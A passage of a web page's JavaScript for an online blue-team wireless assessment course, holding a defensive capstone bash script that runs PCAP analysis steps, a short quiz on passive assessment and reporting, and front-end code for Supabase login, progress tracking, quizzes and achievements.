                  code: '#!/bin/bash\n# Capstone Project Master Script\n# This script orchestrates the analysis phase by running the defensive scripts from previous lessons.\n# It assumes you have a PCAP file from your authorized lab capture.\n\necho "[+] Starting Blue Team Wireless Assessment Analysis"\nLAB_PCAP="${1:-capstone_capture.pcap}" # Use provided PCAP or default\n\nif [ ! -f "$LAB_PCAP" ]; then\n    echo "Error: PCAP file $LAB_PCAP not found."\n    echo "Please provide a path to your authorized capture file."\n    exit 1\nfi\n\necho "--- Phase 1: Asset Discovery & Inventory ---"\npython3 lesson_11_inventory.py "$LAB_PCAP" capstone_inventory.csv\n\necho ""\necho "--- Phase 2: Security Protocol Analysis ---"\npython3 lesson_03_pmf_check.py "$LAB_PCAP"\npython3 lesson_04_audit.py "$LAB_PCAP" # Checks for WPS, Open networks, etc.\n\necho ""\necho "--- Phase 3: Traffic & Anomaly Analysis ---"\npython3 lesson_07_deauth_count.py "$LAB_PCAP"\npython3 lesson_16_channel_analysis.py "$LAB_PCAP" # From Lesson 16 enhancement\n\necho ""\necho "--- Phase 4: Report Generation ---"\npython3 lesson_18_reporting.py capstone_inventory.csv CAPSTONE_REPORT.md\n\necho ""\necho "[+] Analysis Complete!"\necho "Review the following files:"\necho "  - Network Inventory: capstone_inventory.csv"\necho "  - Final Report: CAPSTONE_REPORT.md"\necho ""\necho "Next Step: Review the report, prioritize findings, and create a remediation plan."',
                },
              ],
              activities: [
                {
                  title: "Execute a Full Defensive Assessment",
                  description:
                    "Carry out the entire 5-phase process on your isolated lab network. Deliverable: A professional PDF report (convert your markdown) that includes an Executive Summary, Methodology, Detailed Findings with Evidence, and a Conclusion with prioritized recommendations.",
                },
                {
                  title: "Develop a Hardening Plan",
                  description:
                    "Based on your report, create a separate 'Hardening Plan' document. This should be a simple table with columns: Finding ID, Finding Title, Remediation Step, Priority (Critical/High/Med/Low), Owner, Target Date, and Status. This is the document you would use to track progress with a client or your own team.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the key deliverable of the capstone assessment project?",
                  options: [
                    "A folder containing many PCAP files.",
                    "A list of potential passwords.",
                    "A professional, evidence-based security report that clearly communicates risk and provides actionable hardening advice.",
                    "A certified hacking credential.",
                  ],
                  correct: 2,
                  explanation:
                    "The ultimate goal of a defensive assessment is to produce a clear, professional report that the stakeholder can use to understand their risks and make informed decisions about improving their security posture. The report is the product.",
                },
                {
                  id: 2,
                  question:
                    "The methodology for this capstone is strictly 'passive-only'. What is the primary reason for this constraint?",
                  options: [
                    "Passive tools are more expensive.",
                    "Passive assessment is the least intrusive and safest method, reducing the risk of disrupting network operations during the assessment—a key concern for defenders.",
                    "Active tools are illegal.",
                    "Passive assessment is less accurate.",
                  ],
                  correct: 1,
                  explanation:
                    "A core tenet of defensive and ethical security testing is to minimize impact and avoid disruption. Passive monitoring, by definition, only listens and does not transmit, making it the safest choice for initial discovery and assessment, especially in a production environment.",
                },
                {
                  id: 3,
                  question:
                    "Why is the 'Remediation & Validation' phase considered a critical part of the lifecycle, even in a capstone project?",
                  options: [
                    "It is not important.",
                    "It proves that the vulnerabilities you documented were real and that the proposed fixes are effective, closing the loop and providing true risk reduction.",
                    "It allows you to find more vulnerabilities.",
                    "It makes the report longer.",
                  ],
                  correct: 1,
                  explanation:
                    "Finding and reporting vulnerabilities is only half the job. Verifying that they have been properly fixed is what actually reduces risk. This validation step is what separates a mature security program from an immature one.",
                },
              ],
            },
          },
        ],
      };

      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
         await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
